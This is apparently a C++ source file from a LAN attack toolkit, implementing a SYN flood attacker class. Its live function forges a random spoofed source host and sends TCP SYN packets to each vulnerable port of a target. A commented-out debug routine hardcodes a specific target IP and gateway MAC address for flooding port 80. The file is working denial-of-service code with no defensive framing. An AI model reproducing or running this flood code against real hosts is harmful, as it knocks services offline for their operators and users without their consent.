#include "synfloodattacker.h"
#include <QDebug>
#include "LANAttacker/lanpcap.h"
#include <QTime>
#include <windows.h>






//void SynFloodAttacker::SendSynDebug()
//{
//     if(_LANPcap)
//     {
//         LANHostInfo SrcHost;



//         //set a random ip,don't use ip address in the same LAN
//         for(int i=0;i<4;++i)SrcHost.Ipv4Addr[i]=qrand()%0xff;
//         //fill the mac address with random value
//         for(int i=0;i<6;++i)SrcHost.MacAddr[i]=qrand()%0xff;
//         LANHostInfo DstHost;


//         //172.21.96.43,fill the mac with gateway's mac
//         DstHost.Ipv4Addr[0]=172; DstHost.Ipv4Addr[1]=21;DstHost.Ipv4Addr[2]=96;DstHost.Ipv4Addr[3]=43;
//         DstHost.MacAddr[0]=0x44; DstHost.MacAddr[1]=0xd3;DstHost.MacAddr[2]=0xca; DstHost.MacAddr[3]=0x5e;DstHost.MacAddr[4]=0x13; DstHost.MacAddr[5]=0x80;
//         _LANPcap->SendTcpSynPacket(SrcHost,DstHost,(qrand()%65534)+1,80);

//        // _LANPcap->SendTcpSynPacket(_LANPcap->GetHostInfo(146),DstHost,(qrand()%65534)+1,80);

//     }
//}







void SynFloodAttacker::AttackBehaveImpl(const LANHostInfo &TargetHost)
{

    if(!TargetHost.bIsHostVulerable)return ;


    LANHostInfo SrcHost=LANHostInfo::CreateRandomHost();



    for(int i=0;i<CheckVulerablePortsSize;++i)
    {
        //if it is vulerable port we send packet to its vulerable port
        if(TargetHost.bPortVulerable[i])
        {
           GetLANPCap()->SendTcpSynPacket(SrcHost,TargetHost,(qrand()%65534)+1,CheckVulerablePorts[i]);

        }
    }
}
